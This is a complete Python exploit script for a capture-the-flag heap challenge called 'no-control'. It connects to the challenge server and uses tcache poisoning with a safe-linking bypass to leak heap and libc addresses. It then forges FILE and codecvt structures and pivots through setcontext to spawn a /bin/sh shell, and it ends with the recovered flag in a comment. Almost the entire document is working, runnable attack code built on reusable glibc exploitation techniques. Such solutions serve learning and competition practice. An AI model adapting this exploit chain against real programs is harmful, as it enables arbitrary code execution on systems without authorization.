#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'no-control.beginners.seccon.games', 'port':9005})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_stdin      = libc.symbols['_IO_2_1_stdin_']
ofs_libc_mainarena  = ofs_libc_stdin + 0x1e0

#==========

def attack(conn, **kwargs):
    nc = NoControl(conn)

    nc.create(0)
    nc.delete(0)
    nc.create(0)
    addr_heap_base = u(nc.read(0)) << 12
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    nc.create(1)
    nc.create(2)

    nc.delete(1)
    nc.delete(0)
    nc.update(-1, p64(protect_ptr(addr_heap_base + 0x10)))
    nc.create(0)
    nc.create(4)

    nc.update(4, b'\x00'*0xe+p16(7))

    nc.delete(0)
    nc.update(4, b'\x00'*0xe+p16(1))
    nc.delete(2)
    nc.update(-1, p64(protect_ptr(addr_heap_base + 0x2a0)))
    nc.create(2)

    nc.create(0)
    addr_libc_mainarena = u(nc.read(0))-0x60
    libc.address = addr_libc_mainarena - ofs_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_stderr        = libc.symbols['_IO_2_1_stderr_']
    addr_libc_wfile_jumps   = libc.symbols['_IO_wfile_jumps']
    addr_libc_bss           = libc.sep_section['.bss']
    addr_libc_setcontext    = libc.sep_function['setcontext']
    addr_libc_system        = libc.sep_function['system']
    addr_libc_str_sh        = next(libc.search(b'/bin/sh'))

    def aaw(addr, data):
        def aaw_limited(addr, data):
            nc.update(4, b'\x00'*0xe+p16(1))
            nc.delete(2)
            nc.update(-1, p64(addr ^ (addr_heap_base >> 12)))
            nc.create(2)
            nc.create(0)
            nc.update(0, data)

        spdata = split_n(data, 0x80)
        for i in range(len(spdata)):
            aaw_limited(addr+0x80*i, spdata[i])

    # fp._mode > 0
    # fp._wide_data->_IO_write_ptr > fp._wide_data->_IO_write_base
    fake_file  = p64(0)
    fake_file += p64(addr_heap_base+0x1000)         # _codecvt
    fake_file += p64(addr_libc_stderr+0xe0-0x20)    # _wide_data
    fake_file += b'\x00'*0x18
    fake_file += p32(1)                             # _mode
    fake_file += b'\x00'*0x14
    fake_file += p64(addr_libc_wfile_jumps-8)       # _vtable

    fake_wide_data  = p64(addr_libc_bss)            # _IO_write_ptr: r/w
 
    aaw(addr_libc_stderr + 0x90, fake_file + fake_wide_data)

    # __cd_out.step->__shlib_handle == 0
    fake_gconvstep  = p64(0)                        # __cd_out.step->__shlib_handle
    fake_gconvstep += b'\x00'*0x20
    fake_gconvstep += p64(addr_libc_setcontext)     # __cd_out.step->__fct
    fake_codecvt    = fake_gconvstep.ljust(0x38, b'\x00')
    fake_codecvt   += p64(addr_heap_base+0x1000)    # __cd_out.step
 
    frame = SigreturnFrame()
    frame.rdi = addr_libc_str_sh
    frame.rsp = addr_heap_base + 0x10000-8
    frame.rip = addr_libc_system
 
    ucontext      = fake_codecvt.ljust(0x40, b'\x00')+bytes(frame)[0x40:0xe0]
    ucontext     += p64(addr_libc_bss)              # uc_mcontext.fpregs; r/w

    aaw(addr_heap_base+0x1000, ucontext)

    # _IO_flush_all_lockp -> _IO_new_file_finish -> __GI__IO_wdo_write -> __libio_codecvt_out
    nc.exit()

class NoControl:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def create(self, idx):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'index: ', str(idx).encode())

    def read(self, idx):
        self.sendlineafter(b'> ', b'2')
        self.sendlineafter(b'index: ', str(idx).encode())
        return self.recvuntil(b'\n1. ', drop=True)

    def update(self, idx, data):
        self.sendlineafter(b'> ', b'3')
        self.sendlineafter(b'index: ', str(idx).encode())
        self.sendafter(b'content: ', data)

    def delete(self, idx):
        self.sendlineafter(b'> ', b'4')
        self.sendlineafter(b'index: ', str(idx).encode())

    def exit(self):
        self.sendlineafter(b'> ', b'5')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # ctf4b{w1sh_y0u_w3r3_h3r3}

if __name__=='__main__':
    main()

#==========
